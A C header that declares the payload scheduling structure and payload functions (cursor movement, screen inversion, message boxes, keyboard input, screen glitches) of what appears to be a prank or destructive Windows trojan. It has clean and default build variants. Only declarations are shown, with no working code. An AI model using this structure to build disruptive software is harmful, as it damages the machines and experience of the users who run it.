#define PAYLOADHOST(name) DWORD (WINAPI name)(LPVOID parameter)

typedef struct {
	PAYLOADHOST(*payloadHost);
	void *payloadFunction;

#ifdef CLEAN
	wchar_t *name;
	BOOLEAN safe;

	HWND btn;
	int delaytime, delay, runtime, times;
#else
	int startDelay;
	int delaytime, delay, runtime, times;
#endif
} PAYLOAD;

#ifdef CLEAN
	#define Payload(Name, Host, Function, Delay, Safe) {Host, Function, Name, Safe, 0, 0, 0, 0, 0}
#else
	#define Payload(Name, Host, Function, Delay, Safe) {Host, Function, Delay, 0, 0, 0, 0}
#endif

#ifdef CLEAN
	#define PAYLOADFUNCTIONDEFAULT(name) int name (int times, int runtime, BOOLEAN skip)
	#define PAYLOADFUNCTIONVISUAL(name) int name (int times, int runtime, BOOLEAN skip, HWND hwnd, HDC hdc, LPRECT rekt, int w, int h)
	#define PAYLOADHEAD if (skip) goto out;
#else
	#define PAYLOADFUNCTIONDEFAULT(name) int name (int times, int runtime)
	#define PAYLOADFUNCTIONVISUAL(name) int name (int times, int runtime, HWND hwnd, HDC hdc, LPRECT rekt, int w, int h)
	#define PAYLOADHEAD
#endif

PAYLOADHOST(payloadHostDefault);
PAYLOADHOST(payloadHostVisual);

PAYLOADFUNCTIONDEFAULT(payloadExecute);
PAYLOADFUNCTIONDEFAULT(payloadCursor);
PAYLOADFUNCTIONVISUAL(payloadInvertScreen);
PAYLOADFUNCTIONDEFAULT(payloadMessageBox);
PAYLOADFUNCTIONDEFAULT(payloadReverseText);
PAYLOADFUNCTIONDEFAULT(payloadWindowsSounds);
PAYLOADFUNCTIONVISUAL(payloadScreenGlitches);
PAYLOADFUNCTIONDEFAULT(payloadKeyboard);
PAYLOADFUNCTIONVISUAL(payloadTunnel);
PAYLOADFUNCTIONVISUAL(payloadDrawErrors);
PAYLOADHOST(payloadCrazyBus);

#pragma once
extern PAYLOAD payloads[];
extern const size_t nPayloads;